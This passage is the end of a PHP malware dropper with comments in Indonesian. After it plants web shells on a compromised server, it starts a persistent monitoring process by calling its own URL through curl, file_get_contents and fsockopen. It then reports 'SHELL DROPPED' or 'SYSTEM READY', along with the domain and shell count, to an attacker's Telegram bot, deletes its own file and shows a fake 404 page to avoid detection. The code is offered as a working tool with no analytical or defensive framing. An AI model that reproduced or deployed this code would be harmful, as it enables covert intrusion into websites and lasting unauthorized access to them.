            if (@posix_kill($oldPid, 0)) $monitorRunning = true;
        }
    }
    
    // FORK MONITORING JIKA BELUM PERNAH DI-KILL DAN BELUM JALAN
    if (!file_exists($disableFile) && !$monitorRunning) {
        
        // FORK VIA CURL
        $selfUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . "://$domain" . $_SERVER['PHP_SELF'] . "?monitor=1&rand=" . rand(1,9999);
        
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $selfUrl);
            curl_setopt($ch, CURLOPT_TIMEOUT, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_NOSIGNAL, true);
            curl_setopt($ch, CURLOPT_NOBODY, true);
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_exec($ch);
            curl_close($ch);
        }
        
        if (function_exists('file_get_contents')) @file_get_contents($selfUrl);
        
        // FORK VIA FSOCKOPEN
        $parts = parse_url($selfUrl);
        $host = $parts['host'];
        $port = ($parts['scheme'] ?? 'http') === 'https' ? 443 : 80;
        $path = ($parts['path'] ?? '') . '?' . ($parts['query'] ?? '');
        $fp = @fsockopen(($port == 443 ? 'ssl://' : '') . $host, $port, $errno, $errstr, 2);
        if ($fp) {
            fwrite($fp, "GET $path HTTP/1.1\r\nHost: $host\r\nConnection: Close\r\n\r\n");
            fclose($fp);
        }
        
        sendTelegramMessage($botToken, $chatId, "✅ <b>SYSTEM READY</b>\nDomain: $domain\nShell: " . count($shells) . "/5\nMonitoring: STARTED");
        
        // 🟢 SCRIPT HILANG SETELAH 3 DETIK
        sleep(3);
        @unlink(__FILE__);
        
    } else {
        sendTelegramMessage($botToken, $chatId, "✅ <b>SHELL DROPPED</b>\nDomain: $domain\nShell: " . count($shells) . "/5\nMonitoring: " . (file_exists($disableFile) ? 'DISABLED' : 'ALREADY RUNNING'));
        
        // KALAU SUDAH DI-KILL, HAPUS LANGSUNG
        if (file_exists($disableFile)) {
            @unlink(__FILE__);
        }
    }
}

// TAMPILKAN 404
header("HTTP/1.0 404 Not Found");
echo "<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></body></html>";
exit;
?>
